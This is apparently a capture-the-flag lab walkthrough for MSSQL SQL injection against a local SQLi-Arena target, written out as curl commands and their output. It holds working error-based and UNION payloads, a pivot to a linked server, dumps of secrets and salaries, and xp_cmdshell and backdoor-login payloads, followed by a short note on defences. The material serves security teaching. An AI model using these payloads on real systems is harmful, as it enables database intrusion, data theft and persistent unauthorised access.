<h4>Step 1: Test Normal Customer Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=John"<br><br>
        <span class="prompt">Input: </span>John<br>
        <span class="prompt">SQL: </span>SELECT id, name, email FROM customers WHERE name LIKE '%John%'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>John Smith</strong> &bull; john.smith@example.com<br>
        <strong>Bob Johnson</strong> &bull; bob.johnson@example.com
    </div>
</div>

<h4>Step 2: Confirm Injection and Enumerate</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error + Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "name='"<br>
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: Unclosed quotation mark after the character string '%'%'.</strong><br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "name=' AND 1=CONVERT(INT, DB_NAME()) -- -"<br>
        <span class="prompt">// Database name:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, DB_NAME()) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value 'sqli_arena_mssql_lab13' to data type int.</strong><br><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "name=' AND 1=CONVERT(INT, (SELECT STRING_AGG(TABLE_NAME, ',') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')) -- -"<br>
        <span class="prompt">// All tables:</span><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT STRING_AGG(TABLE_NAME, ',') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value 'customers,flags' to data type int.</strong>
    </div>
</div>

<h4>Step 3: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_l1nk3d_s3rv3r_p1v0t}' to data type int.</strong>
    </div>
</div>

<h4>Step 4: Discover Linked Servers</h4>
<p>MSSQL stores linked server info in <code>sys.servers</code>. Enumerate to find pivot targets:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Linked Server Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// List linked servers:</span><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sys.servers WHERE is_linked=1)) -- -"<br><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sys.servers WHERE is_linked=1)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value 'INTERNAL_DB_SRV' to data type int.</strong><br><br>
        <span class="prompt">Found: </span>Linked server "INTERNAL_DB_SRV" -- a pivot target!
    </div>
</div>

<h4>Step 5: Enumerate Server B via OPENQUERY</h4>
<p>Use <code>OPENQUERY()</code> to run queries on the linked server and discover its tables:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Server B Table Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// List tables on Server B:</span><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' UNION SELECT 1, TABLE_NAME, 'x' FROM OPENQUERY(INTERNAL_DB_SRV, 'SELECT TABLE_NAME FROM sqli_arena_internal_db.INFORMATION_SCHEMA.TABLES') -- -"<br><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, TABLE_NAME, 'x' FROM OPENQUERY(INTERNAL_DB_SRV, 'SELECT TABLE_NAME FROM sqli_arena_internal_db.INFORMATION_SCHEMA.TABLES') -- -<br>
        <span class="prompt">Output: </span><strong>internal_users</strong> | <strong>salary_data</strong> | <strong>secrets</strong><br><br>
        <span class="prompt">// List columns in secrets table:</span><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "..." --data-urlencode "name=' AND 1=CONVERT(INT, (SELECT STRING_AGG(COLUMN_NAME, ',') FROM OPENQUERY(INTERNAL_DB_SRV, 'SELECT COLUMN_NAME FROM sqli_arena_internal_db.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=''secrets'''))) -- -"<br><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT STRING_AGG(COLUMN_NAME, ',') FROM OPENQUERY(INTERNAL_DB_SRV, 'SELECT COLUMN_NAME FROM sqli_arena_internal_db.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=''secrets'''))) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value 'id,secret_name,secret_value,classification' to data type int.</strong>
    </div>
</div>

<h4>Step 6: Extract Secrets via Four-Part Naming</h4>
<p>Use four-part naming (<code>[SERVER].[DB].[SCHEMA].[TABLE]</code>) to directly access Server B's data:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Secret Extraction from Server B</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Extract all secrets from Server B:</span><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' UNION SELECT id, secret_name, secret_value FROM [INTERNAL_DB_SRV].[sqli_arena_internal_db].[dbo].[secrets] -- -"<br><br>
        <span class="prompt">Input: </span>' UNION SELECT id, secret_name, secret_value FROM [INTERNAL_DB_SRV].[sqli_arena_internal_db].[dbo].[secrets] -- -<br>
        <span class="prompt">Output:</span><br>
        <strong>API Master Key</strong> &bull; sk-prod-9f8e7d6c5b4a3210<br>
        <strong>Database Root Password</strong> &bull; S3rv3rB_R00t_P@ss!<br>
        <strong>Encryption Key</strong> &bull; aes256-0xDEADBEEF42<br>
        <strong>Internal Flag</strong> &bull; FLAG{p1v0t3d_t0_s3rv3r_B!}
    </div>
</div>

<h4>Step 7: Exfiltrate Internal Users and Salary Data</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Full Server B Compromise</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Internal users:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, username, role + ' - ' + department FROM [INTERNAL_DB_SRV].[sqli_arena_internal_db].[dbo].[internal_users] -- -<br>
        <span class="prompt">Output:</span><br>
        <strong>svc_backup</strong>: service_account - IT Operations<br>
        <strong>admin_intern</strong>: admin - IT Security<br>
        <strong>db_admin</strong>: dba - Database Team<br>
        <strong>cfo_account</strong>: executive - Finance<br><br>
        <span class="prompt">// Salary data:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, employee, CAST(salary AS VARCHAR) + ' + ' + CAST(bonus AS VARCHAR) FROM [INTERNAL_DB_SRV].[sqli_arena_internal_db].[dbo].[salary_data] -- -<br>
        <span class="prompt">Output:</span><br>
        <strong>CEO</strong>: 450000.00 + 200000.00<br>
        <strong>CFO</strong>: 320000.00 + 150000.00<br>
        <strong>CTO</strong>: 340000.00 + 160000.00<br>
        <strong>CISO</strong>: 280000.00 + 120000.00
    </div>
</div>

<h4>Step 8: Remote Command Execution via EXEC AT</h4>
<p>With RPC enabled on the linked server, <code>EXEC ... AT</code> runs statements on Server B:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. EXEC AT Linked Server</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Execute arbitrary SQL on Server B:</span><br>
        <span class="prompt">Input: </span>'; EXEC('SELECT @@SERVERNAME') AT INTERNAL_DB_SRV; -- -<br><br>
        <span class="prompt">// Attempt xp_cmdshell on Server B (if available):</span><br>
        <span class="prompt">Input: </span>'; EXEC('EXEC xp_cmdshell ''whoami''') AT INTERNAL_DB_SRV; -- -<br><br>
        <span class="prompt">// Create backdoor account on Server B:</span><br>
        <span class="prompt">Input: </span>'; EXEC('CREATE LOGIN backdoor WITH PASSWORD=''Pwn3d!''') AT INTERNAL_DB_SRV; -- -
    </div>
</div>

<h4>Step 9: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_l1nk3d_s3rv3r_p1v0t}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit Chain</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Step 1: Extract local flag</span><br>
        <span class="prompt">// Step 1: Extract local flag</span><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br>
        <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_l1nk3d_s3rv3r_p1v0t}' to data type int.</strong><br><br>
        <span class="prompt">// Step 2: Discover linked server</span><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sys.servers WHERE is_linked=1)) -- -"<br>
        <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value 'INTERNAL_DB_SRV' to data type int.</strong><br><br>
        <span class="prompt">// Step 3: Pivot to Server B and dump secrets</span><br>
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab13" \<br> --data-urlencode "name=' UNION SELECT id, secret_name, secret_value FROM [INTERNAL_DB_SRV].[sqli_arena_internal_db].[dbo].[secrets] -- -"<br>
        <span class="prompt">Output: </span><strong>API Master Key</strong> | <strong>Database Root Password</strong> | <strong>Encryption Key</strong> | <strong>Internal Flag: FLAG{p1v0t3d_t0_s3rv3r_B!}</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MSSQL linked servers allow SQL injection on one server to
    pivot to entirely different database instances. <code>OPENQUERY()</code> and four-part naming
    (<code>[SERVER].[DB].[SCHEMA].[TABLE]</code>) enable cross-server queries, while
    <code>EXEC ... AT linked_server</code> enables remote command execution. A single SQL
    injection vulnerability can compromise an entire network of linked database servers.
    Remove unnecessary linked servers, use minimal-privilege accounts for linked server
    mappings, and never use sysadmin credentials for linked server connections.
</div>
